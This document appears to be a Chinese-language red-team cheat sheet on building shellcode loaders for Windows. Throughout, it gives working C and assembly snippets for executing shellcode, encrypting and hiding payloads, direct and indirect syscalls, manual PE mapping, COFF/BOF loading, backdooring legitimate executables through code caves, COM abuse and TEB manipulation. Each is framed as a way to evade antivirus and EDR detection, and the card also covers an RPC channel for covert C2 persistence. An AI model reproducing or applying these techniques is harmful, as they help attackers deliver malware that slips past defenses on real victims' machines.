# Shellcode加载器设计 — 速查卡

> 红队武器开发。加载器架构、存储、加密、执行、Syscall、PE结构、手动映射。
> 来源：红队武器开发系列 2/4

## §1 基本框架

经典三步（会被标RWX）：
```c
void* buf = VirtualAlloc(NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
memcpy(buf, shellcode, len);
CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buf, NULL, 0, NULL);
```

改进版（RW→RX分离，避RWX检测）：
```c
void* buf = VirtualAlloc(NULL, len, MEM_COMMIT, PAGE_READWRITE);
memcpy(buf, shellcode, len);
DWORD old;
VirtualProtect(buf, len, PAGE_EXECUTE_READ, &old);
CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buf, NULL, 0, NULL);
```

## §2 Shellcode存储

| 方式 | 做法 | 特征 |
|------|------|------|
| 硬编码 | `unsigned char sc[] = {0xfc,0x48...};` | 最简单，静态扫描秒杀 |
| 资源段 | RC嵌入→`FindResource`+`LoadResource`+`LockResource` | 不在.text段，绕部分静态 |
| 远程拉取 | `WinHTTP/WinInet` HTTPS下载 | 加载器无恶意特征，流量可能被抓 |
| 文件读取 | 读.dat/.bin/图片尾部附加 | 需落地文件 |
| 注册表 | `RegSetValueEx`写入→`RegQueryValueEx`读取 | 无文件落地，持久化友好 |

## §3 加密方式

XOR（最简单）：
```c
for (int i = 0; i < len; i++) buf[i] ^= key[i % keylen];
```

AES（推荐）：
```python
# 加密端 (pycryptodome)
cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted = cipher.encrypt(pad(shellcode))
```
C端用BCrypt或自实现解密。

UUID编码（无明显密文特征）：
```c
// shellcode编码为UUID字符串数组
UuidFromStringA((RPC_CSTR)uuid_array[i], (UUID*)ptr);  // 逐个还原
```

RC4：密钥短、实现<20行C，适合嵌入式场景。

## §4 执行方式

| 方式 | 调用 | 优势 |
|------|------|------|
| 函数指针 | `((void(*)())buf)()` | 最短，无额外API |
| 回调执行 | `EnumFontsW(hdc,0,(FONTENUMPROC)buf,0)` | 无CreateThread |
| 回调变体 | `CreateTimerQueueTimer / CertEnumSystemStore / EnumWindows` | 同上，换API绕检测 |
| Fiber | `ConvertThreadToFiber(0); PVOID f=CreateFiber(0,(LPFIBER_START_ROUTINE)buf,0); SwitchToFiber(f)` | 无新线程创建 |
| 线程池 | `TpAllocWork(&work,buf,NULL,NULL); TpPostWork(work); TpReleaseWork(work)` | 复用系统线程池 |

## §5 Syscall直调

SysWhispers2/3：
```
python syswhispers.py -f NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -o syscalls
# 生成 syscalls.h + syscalls.asm，项目引入直接调用
```

Hell's Gate：运行时遍历ntdll EAT→解析`mov r10,rcx; mov eax,SSN`模式→提取syscall号→动态调用。

间接Syscall：设置eax=SSN后`jmp`到ntdll中`syscall;ret`的gadget地址，回溯栈帧指向ntdll。

## §6 PE转Shellcode

| 工具 | 用法 | 输入 |
|------|------|------|
| donut | `donut.exe -i payload.exe -o payload.bin` | EXE/DLL/VBS/JS/.NET |
| sRDI | `python ConvertToShellcode.py payload.dll` | DLL→反射Shellcode |
| pe2shc | `pe2shc.exe payload.exe payload.bin` | EXE→Shellcode |

组合拳：`msfvenom → AES加密 → 资源段嵌入 → Syscall加载 → 回调执行`

检测对抗优先级：Syscall直调 > RW+RX分离 > 加密存储 > 回调执行 > 远程拉取

## §7 Windows API基础（来源：红队武器开发-2）

**句柄（Handle）**：Windows对象（文件/进程/线程）的间接引用，内部维护表记录资源地址+类型。所有交互通过句柄，不能直接访问对象。

**关键API模式**：
| 用途 | API | 说明 |
|------|-----|------|
| 进程枚举 | `CreateToolhelp32Snapshot`+`Process32First/Next` | 遍历进程列表 |
| 模块枚举 | `EnumProcessModules`+`GetModuleFileNameExA` | 获取进程加载的DLL |
| 远程写入 | `OpenProcess`→`VirtualAllocEx`→`WriteProcessMemory` | 跨进程写内存基础链 |
| 网络下载 | `InternetOpen`→`InternetOpenUrl`→`InternetReadFile` | WinInet拉取shellcode |

**WinMain入口**：GUI程序入口`WinMain(HINSTANCE,HINSTANCE,LPSTR,int)`替代`main`，`windows.h`包含全部WinAPI声明。

## §8 PE文件结构与手动映射（来源：红队武器开发-4）

**PE结构速查**：
```
DOS Header (e_magic=MZ, e_lfanew→NT头偏移)
  → NT Headers (Signature=PE\0\0)
    → File Header (Machine/NumberOfSections/TimeDateStamp)
    → Optional Header (ImageBase/AddressOfEntryPoint/SectionAlignment/FileAlignment)
  → Section Headers[] (.text/.data/.rdata/.rsrc/.reloc/.pdata)
```

**地址转换**：`VA = ImageBase + RVA`，`文件偏移 = RVA - Section.VirtualAddress + Section.PointerToRawData`

**导入表解析**（IAT填充是手动映射的核心）：
```c
// 遍历IMAGE_IMPORT_DESCRIPTOR
while (pImportDesc->Name) {
    HMODULE hMod = LoadLibraryA((char*)((DWORD_PTR)base + pImportDesc->Name));
    // 遍历OriginalFirstThunk获取函数名，填充FirstThunk（IAT）
    pThunk->u1.Function = (DWORD_PTR)GetProcAddress(hMod, funcName);
}
```

**重定位修复**：当实际加载地址≠ImageBase时，遍历`.reloc`段逐项修正：
```c
DWORD_PTR delta = (DWORD_PTR)actualBase - ntHeaders->OptionalHeader.ImageBase;
// 遍历IMAGE_BASE_RELOCATION块，按类型修正每个条目
*(DWORD_PTR*)(relocAddr) += delta;
```

**手动PE映射流程**（RunPE/内存加载器）：
1. 分配内存（SizeOfImage大小）
2. 复制PE头 + 按SectionHeader逐段复制节区
3. 修复重定位（delta = actualBase - preferredBase）
4. 解析导入表 → LoadLibrary + GetProcAddress填充IAT
5. 调用入口点 `((void(*)(void))entryPoint)()`

**分离加载**：shellcode与加载器分开存储，加载器从URL/文件/注册表读取加密shellcode→解密→执行，加载器本身无恶意特征。

**CryptoAPI哈希**（PE完整性校验/密钥派生）：
```c
CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
CryptHashData(hHash, data, len, 0);
CryptGetHashParam(hHash, HP_HASHVAL, hash, &hashLen, 0);
```

## §9 COFF Loader与BOF执行（来源：老鑫安全四期-免杀day14）

COFF（Common Object File Format）是编译器生成的中间目标文件。CobaltStrike的BOF（Beacon Object File）基于COFF格式，允许在信标进程内执行自定义代码而无需落地新进程。

**COFF加载流程**：
1. 读取COFF文件→解析COFF头（Machine/节数/符号表偏移）
2. 解析所有Section（.text/.data含机器码和数据）+ 重定位信息
3. 为节区分配RWX内存，复制节区数据
4. 解析符号表→解析外部依赖（如Beacon API）
5. 应用重定位修复地址引用
6. 定位入口函数（go函数）→函数指针调用执行

关键优势：无PE头特征、不落地磁盘、复用宿主进程权限；BOF可访问Beacon内部API。
参考实现：trustedsec/COFFLoader

## §10 PE后门：代码洞与节注入（来源：老鑫安全四期-免杀day9）

将shellcode注入合法PE文件，利用合法签名/功能掩盖恶意行为。

| 方式 | 做法 | VT检测率参考 |
|------|------|-------------|
| 代码洞（Code Cave） | 找.text节中NOP/00填充区→写入shellcode→修改入口点跳转 | ~7/73 |
| 新增节 | 添加新Section→写入shellcode→劫持AddressOfEntryPoint | ~17/72 |

**执行流保持**（x86；x64无pushad，需手动push各寄存器）：
```asm
pushad / pushfd          ; 保存所有寄存器+标志
xor decrypt shellcode    ; 解密执行
popfd / popad            ; 恢复寄存器+标志
jmp original_entry       ; 跳回原始入口点
```

目标PE选择：<10MB、C/C++编译、无ASLR/DEP保护、有合法网络通信功能（掩盖C2流量）。

## §11 COM对象滥用执行（来源：老鑫安全四期-免杀day16）

通过COM接口间接执行命令，不直接调用`CreateProcess`系列API：
```c
CoInitialize(NULL);
CLSID clsid; IID iid;
CLSIDFromString(L"{13709620-C279-11CE-A49E-444553540000}", &clsid);  // Shell.Application
IIDFromString(L"{A4C6892C-3BA9-11D2-9DEA-00C04FB16162}", &iid);      // IShellDispatch2
IShellDispatch2* dispatch = NULL;
CoCreateInstance(clsid, NULL, CLSCTX_INPROC_SERVER, iid, (LPVOID*)&dispatch);
dispatch->ShellExecuteW(L"payload.exe", vNull, vNull, vNull, vNull);
```
EDR对`CreateProcess`有hook，COM间接调用可绕过部分行为检测。

## §12 RPC持久化C2（来源：老鑫安全四期-免杀day17）

利用Windows RPC机制建立隐蔽C2通道。

核心流程：
1. IDL定义接口声明远程函数签名
2. 服务端：`RpcServerUseProtseqEpW`绑定TCP端口 → `RpcServerRegisterIf2`注册接口 → `RpcServerListen`
3. 客户端：`RpcStringBindingComposeW` → `RpcBindingFromStringBindingW` → 调用远程函数

武器化价值：RPC流量是Windows正常通信协议，与SMB/DCOM流量混合难以区分；可注册为系统服务实现持久化。

## §13 高级Fiber执行：TEB操纵（来源：老鑫安全四期-二进制day11）

标准Fiber执行调用`CreateFiber`会被EDR hook。直接操纵TEB绕过：
1. TEB偏移`0x17ee`处设置`HasFiberData`位标志
2. 分配堆内存模拟Fiber数据结构
3. Fiber数据偏移`0x0a8`处写入shellcode地址
4. `__writegsqword(0x20, fiberData)` 设置TEB FiberData指针
5. 调用`ntdll!RtlUserFiberStart`触发执行

```c
_TEB* teb = NtCurrentTeb();
*(char*)((uintptr_t)teb + 0x17ee) |= 0b100;  // HasFiberData bit
LPVOID addr = VirtualAlloc(NULL, sizeof(sc), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
memcpy(addr, sc, sizeof(sc));
uintptr_t fiberData = (uintptr_t)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x100);
*(LPVOID*)(fiberData + 0x0a8) = addr;
__writegsqword(0x20, fiberData);
RtlUserFiberStart();
```
完全绕过`CreateFiber`/`SwitchToFiber`的EDR hook。
